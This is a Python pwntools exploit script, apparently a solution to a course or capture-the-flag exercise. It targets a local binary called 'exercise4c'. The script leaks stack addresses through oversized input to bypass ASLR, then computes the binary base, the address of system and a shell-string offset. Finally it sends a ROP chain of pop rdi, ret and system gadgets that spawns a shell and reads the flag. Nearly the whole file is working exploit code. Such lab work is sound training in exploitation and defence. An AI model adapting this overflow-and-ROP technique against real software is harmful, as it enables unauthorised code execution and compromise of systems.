#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise4/exercise4c'


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break get_message
'''.format(**locals())


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

def get_address(r):
    r.sendline(b"A" * 200)
    r.recvuntil(b"Oh. ")

    string = r.recvuntil(b"?! Really?")
    string = string.replace(b"A", b"").replace(b"?! Really?", b"").strip(b"\n")

    # address of random function in stack (use gdb tools to discover offset with system)
    func_addr = u64(string[0:] + b"\00" * (8 - len(string[0:]))) - 69

    # from debugging get absolute offset between func and system
    system_address = func_addr - 0x40250

    r.sendline(b"A" * 312)
    r.recvuntil(b"Oh. ")

    string = r.recvuntil(b"?! Really?")
    string = string.replace(b"A", b"").replace(b"?! Really?", b"").strip(b"\n")

    # main address
    padding = (8 - len(string[0:]))
    main_address = u64(string[0:] + b"\00" * padding) - 88

    return main_address, system_address


r = start()
r.recvline()


main_address, system_address = get_address(r)

elf = ELF(exe)
main_lower_addr = elf.symbols["main"]

# get base address
base_address = main_address - main_lower_addr

# get shell_address from offset with system_address
# (investigate info proc map output to find shell address in a given run, then compute the offset with system)
shell_address = system_address + 0x16232d

system_address = p64(system_address)
shell_address = p64(shell_address)

# start ROP part
rop = ROP(exe)

# get pop rdi gadget (mimic 4b exercise)
poprdi_gadget = base_address + rop.find_gadget(["pop rdi"])[0]
poprdi_gadget = p64(poprdi_gadget)

# get ret gadget to correct stack misalignment
ret_gadget = base_address + rop.find_gadget(["ret"])[0]
ret_gadget = p64(ret_gadget)

r.sendline(b"A" * 312 + poprdi_gadget + shell_address + ret_gadget + system_address)
r.sendline(b"cat flag")

print(r.recvall(timeout=2))
